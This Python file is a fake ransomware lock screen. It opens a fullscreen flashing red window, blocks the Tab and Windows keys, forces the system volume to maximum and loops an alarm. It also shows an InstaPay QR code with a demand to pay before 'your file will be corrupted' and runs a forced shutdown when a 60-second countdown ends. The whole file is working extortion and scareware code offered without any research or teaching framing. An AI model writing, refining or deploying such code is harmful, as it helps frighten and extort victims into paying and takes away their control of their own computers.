import tkinter as tk
from tkinter import font
from pygame import mixer
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities
import keyboard
from PIL import Image, ImageTk
import os

devices = AudioUtilities.GetSpeakers()  
volume_control = devices.EndpointVolume

keyboard.block_key('tab') 
keyboard.block_key('left windows')
keyboard.block_key('right windows')

def enforce_unmute():
    if volume_control.GetMute() == 1:
        volume_control.SetMute(0, None)
    
    current_vol = volume_control.GetMasterVolumeLevelScalar()
    if current_vol < 1.0:
        new_vol = min(current_vol + 0.01, 1.0) 
        volume_control.SetMasterVolumeLevelScalar(new_vol, None)
    root.after(100, enforce_unmute)
    
speed = 2
frequency = 44100
newfreq = int(frequency * speed)

mixer.init(newfreq)
root=tk.Tk()
root.attributes('-fullscreen', True)

def togglecol():
    current=root.cget("bg")
    new="black" if current == "red" else "red"
    root.config(bg=new)
    def update_children(parent):
        for child in parent.winfo_children():
            try:
                child.config(bg=new)
                if isinstance(child, tk.Label) and child.cget("text"):
                    child.config(fg="white")
            except tk.TclError:
                pass
            update_children(child)
            
    update_children(root)
    root.after(200,togglecol)

def alarm():
    mixer.music.load("alarm.mp3")
    mixer.music.play(loops=-1)
    mixer.music.set_volume(1.0)

def on_closing():
    keyboard.unblock_key('tab')
    keyboard.unblock_key('left windows')
    keyboard.unblock_key('right windows')
    root.destroy()
def gifframes(path):
    frames = []
    i = 0
    while True:
        try:
            frame = tk.PhotoImage(file=path, format=f"gif -index {i}")
            frames.append(frame)
            i += 1
        except tk.TclError:
            break
    return frames

def animate_gif(root, label, frames, delay, current_idx=0):
    if not frames:
        return
    
    label.config(image=frames[current_idx])
    next_idx = (current_idx + 1) % len(frames)
    root.after(delay, animate_gif, root, label, frames, delay, next_idx)

def exit(event, root):
    root.destroy()
def warningui():

    left_frame = tk.Frame(root)
    left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=50, pady=50)
    root.bind("<Escape>", lambda event: exit(event, root))
    right_frame = tk.Frame(root)
    right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=50, pady=50)
    alarm_label = tk.Label(left_frame)
    alarm_label.pack(pady=(10, 5), expand=True, anchor="s") 
    
    try:
        frames = gifframes("alarm.gif") 
        if frames:
            alarm_label.frames = frames 
            animate_gif(root, alarm_label, frames, delay=80)
    except Exception as e:
        print(f"Error loading alarm.gif: {e}")

    title_font = font.Font(family="Helvetica", size=36, weight="bold")
    title_label = tk.Label(left_frame, text="TRANSACTION PENDING", font=title_font, fg="#d32f2f")
    title_label.pack(pady=20)

    msg_text = (
        "Please scan the InstaPay QR code\n"
        "to complete your secure transfer.\n\n" 
        "Your file will be corrupted in:"
    )
    msg_label = tk.Label(left_frame, text=msg_text, font=("Helvetica", 20), justify="center")
    msg_label.pack(pady=10, expand=True, anchor="n")
    timer_font = font.Font(family="Helvetica", size=48, weight="bold")
    timer_label = tk.Label(left_frame, text="01:00", font=timer_font)
    timer_label.pack(pady=10, expand=True, anchor="n")

    countdown(60, timer_label)
    try:
        qr_image = Image.open("qr.jpeg")
        qr_image = qr_image.resize((450, 450), Image.Resampling.LANCZOS)
        qr_photo = ImageTk.PhotoImage(qr_image)
        qr_label = tk.Label(right_frame, image=qr_photo)
        qr_label.image = qr_photo
        qr_label.pack(expand=True)
    except Exception as e:
        print(f"Error loading qr.jpeg: {e}")
        error_label = tk.Label(right_frame, text="[ QR Code Missing ]", font=("Helvetica", 24), fg="red", bg="white")
        error_label.pack(expand=True)
    root.mainloop()
def countdown(time_left, label):
    if time_left >= 0:
        mins, secs = divmod(time_left, 60)
        time_format = f"{mins:02d}:{secs:02d}"
        label.config(text=time_format)
        root.after(1000, countdown, time_left - 1, label)
    else:
        label.config(text="00:00\nSHUTTING DOWN...", fg="white")
        os.system("shutdown /s /t 0")

root.protocol("WM_DELETE_WINDOW", on_closing)
root.config(bg= "red",cursor="none")
togglecol()
alarm()
enforce_unmute()
warningui()
root.bind("<F1>", lambda e: "break")